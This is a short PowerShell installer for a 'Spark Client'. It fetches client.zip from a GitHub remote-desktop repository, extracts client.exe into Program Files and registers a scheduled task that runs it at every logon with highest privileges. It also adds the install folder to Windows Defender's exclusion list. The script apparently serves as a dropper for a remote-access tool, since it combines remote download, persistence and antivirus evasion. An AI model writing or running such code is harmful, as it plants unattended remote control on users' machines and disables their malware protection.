# install-spark-client.ps1
# Auto install Spark Client on Windows (user-level scheduled task)

$RepoUrl = "https://raw.githubusercontent.com/tutamdev/remote-desktop/main"  # chỉnh repo nếu cần
$ZipUrl = "$RepoUrl/client.zip"
$TempZip = "$env:TEMP\client.zip"

$DestDir = "C:\Program Files\Spark"
$DestExe = Join-Path $DestDir "client.exe"
$TaskName = "SparkClient"

Write-Host ">>> Installing Spark Client..."

# 1. Create destination folder
if (!(Test-Path -Path $DestDir)) {
    Write-Host ">>> Creating folder: $DestDir"
    New-Item -Path $DestDir -ItemType Directory -Force | Out-Null
}

# 2. Download client.zip
Write-Host ">>> Downloading client.zip from $ZipUrl"
Invoke-WebRequest -Uri $ZipUrl -OutFile $TempZip -UseBasicParsing

# 3. Extract zip
Write-Host ">>> Extracting client.exe to $DestDir"
Expand-Archive -Path $TempZip -DestinationPath $DestDir -Force

# 4. Remove old scheduled task if exists
if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
    Write-Host ">>> Removing old scheduled task: $TaskName"
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
}

# 5. Create new scheduled task (auto run at user logon, not SYSTEM)
Write-Host ">>> Registering scheduled task for user: $env:USERNAME"
$Action = New-ScheduledTaskAction -Execute $DestExe
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal

# 6. Add Defender exclusion
Write-Host ">>> Adding Windows Defender exclusion: $DestDir"
try {
    Add-MpPreference -ExclusionPath $DestDir
    Write-Host ">>> Defender exclusion added successfully."
} catch {
    Write-Warning ">>> Failed to add exclusion (please run PowerShell as Administrator)."
}

Write-Host ">>> Done. Spark Client will auto-start when $env:USERNAME logs in."
